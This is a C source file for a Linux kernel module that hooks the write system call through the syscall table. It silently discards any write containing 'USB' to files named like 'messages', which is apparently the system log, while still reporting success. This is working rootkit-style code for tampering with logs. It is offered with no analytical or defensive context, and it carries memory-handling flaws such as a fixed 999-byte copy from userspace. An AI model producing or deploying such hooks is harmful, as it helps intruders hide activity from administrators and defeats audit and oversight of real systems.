#define __KERNEL__
#define MODULE

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>

EXPORT_NO_SYMBOLS;
MODULE_LICENSE("GPL");

extern void *sys_call_table[];

char hide_file[] = "messages";
char hide_string[] = "USB";

int (*old_write)(int, const void *, size_t);
int new_write(int, const void *, size_t);

int init_module(void)
{
  old_write = sys_call_table[__NR_write];
  sys_call_table[__NR_write] = new_write;
  return 0;
}

void cleanup_module(void)
{
  sys_call_table[__NR_write] = old_write;
}

int new_write(int fd, const void *buf, size_t count)
{
  char *buf2;
  struct file *file = (struct file *)fget(fd);
  struct qstr *test = (struct qstr *)&file->f_dentry->d_name;

  if( (strstr(test->name, hide_file) != NULL) && current->p_pptr->pid > 1 )
    {
      printk("TEST\n");
      fput(file);      

      buf2 = (char*) kmalloc(1000, GFP_KERNEL); 
      copy_from_user(buf2, buf, 999);

      if(strstr(buf2, hide_string) != NULL)
	{
	  kfree(buf2);
	  return count;
	}
      else
	{
	  kfree(buf2);
	  return old_write(fd, buf, count);
	}
    }
  else
    {
      fput(file);
      return old_write(fd, buf, count);
    }
}
